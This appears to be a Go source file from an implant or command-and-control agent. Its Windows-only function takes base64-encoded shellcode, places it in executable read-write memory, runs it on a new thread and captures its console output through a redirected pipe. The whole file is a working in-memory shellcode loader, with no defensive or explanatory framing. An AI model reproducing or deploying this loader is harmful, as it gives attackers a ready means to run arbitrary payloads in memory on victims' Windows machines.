//go:build windows

package platform

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	scKernel32          = syscall.NewLazyDLL("kernel32.dll")
	scVirtualAlloc      = scKernel32.NewProc("VirtualAlloc")
	scCreateThread      = scKernel32.NewProc("CreateThread")
	scWaitForSingle     = scKernel32.NewProc("WaitForSingleObject")
	scCloseHandle       = scKernel32.NewProc("CloseHandle")
	scRtlMoveMemory     = scKernel32.NewProc("RtlMoveMemory")
	scSetStdHandle      = scKernel32.NewProc("SetStdHandle")
	scGetStdHandle      = scKernel32.NewProc("GetStdHandle")
	scCreatePipe        = scKernel32.NewProc("CreatePipe")
)

const (
	scMemCommitReserve     = 0x3000
	scPageExecuteReadWrite = 0x40
	scStdOutputHandle      = ^uintptr(10) // (DWORD)-11
	scStdErrorHandle       = ^uintptr(11) // (DWORD)-12
)

func ExecShellcodeWindows(ctx context.Context,
	b64 string, waitSecs int) (string, int, error) {

	shellcode, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return "", -1, fmt.Errorf("base64: %w", err)
	}
	if len(shellcode) == 0 {
		return "", -1, fmt.Errorf("empty shellcode")
	}
	if len(shellcode) > 64*1024*1024 {
		return "", -1, fmt.Errorf("shellcode too large (%d bytes)",
			len(shellcode))
	}

	var readPipeRaw, writePipeRaw syscall.Handle
	r, _, errno := scCreatePipe.Call(
		uintptr(unsafe.Pointer(&readPipeRaw)),
		uintptr(unsafe.Pointer(&writePipeRaw)),
		0, 0)
	if r == 0 {
		return "", -1, fmt.Errorf("CreatePipe: %v", errno)
	}

	readPipe := os.NewFile(uintptr(readPipeRaw), "shellcode_stdout")
	writePipe := os.NewFile(uintptr(writePipeRaw), "shellcode_stdin")
	defer readPipe.Close()

	oldOut, _, _ := scGetStdHandle.Call(scStdOutputHandle)
	oldErr, _, _ := scGetStdHandle.Call(scStdErrorHandle)
	defer func() {
		scSetStdHandle.Call(scStdOutputHandle, oldOut)
		scSetStdHandle.Call(scStdErrorHandle, oldErr)
	}()

	scSetStdHandle.Call(scStdOutputHandle, uintptr(writePipeRaw))
	scSetStdHandle.Call(scStdErrorHandle, uintptr(writePipeRaw))

	addr, _, errno := scVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		scMemCommitReserve,
		scPageExecuteReadWrite,
	)
	if addr == 0 {
		writePipe.Close()
		return "", -1, fmt.Errorf("VirtualAlloc: %v", errno)
	}
	defer scVirtualFree(scKernel32, addr)

	scRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	var threadID uint32
	hThread, _, errno := scCreateThread.Call(
		0, 0, addr, 0, 0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread == 0 {
		writePipe.Close()
		return "", -1, fmt.Errorf("CreateThread: %v", errno)
	}
	defer scCloseHandle.Call(hThread)

	if waitSecs <= 0 {
		waitSecs = 300
	}

	var (
		captured   []byte
		captureMu  sync.Mutex
		drainDone  = make(chan struct{})
		totalBytes = 0
	)
	go func() {
		defer close(drainDone)
		buf := make([]byte, 8192)
		for {
			n, rerr := readPipe.Read(buf)
			if n > 0 {
				captureMu.Lock()
				if totalBytes < 4*1024*1024 {
					captured = append(captured, buf[:n]...)
					totalBytes += n
				}
				captureMu.Unlock()
			}
			if rerr != nil {
				return
			}
		}
	}()

	waitCh := make(chan struct{})
	go func() {
		scWaitForSingle.Call(hThread, uintptr(waitSecs*1000))
		close(waitCh)
	}()

	select {
	case <-waitCh:
	case <-ctx.Done():
	case <-time.After(time.Duration(waitSecs+5) * time.Second):
	}

	writePipe.Close()

	select {
	case <-drainDone:
	case <-time.After(2 * time.Second):
	}

	captureMu.Lock()
	out := string(captured)
	captureMu.Unlock()

	return out, 0, nil
}

func scVirtualFree(k32 *syscall.LazyDLL, addr uintptr) {
	k32.NewProc("VirtualFree").Call(addr, 0, 0x8000) // MEM_RELEASE
}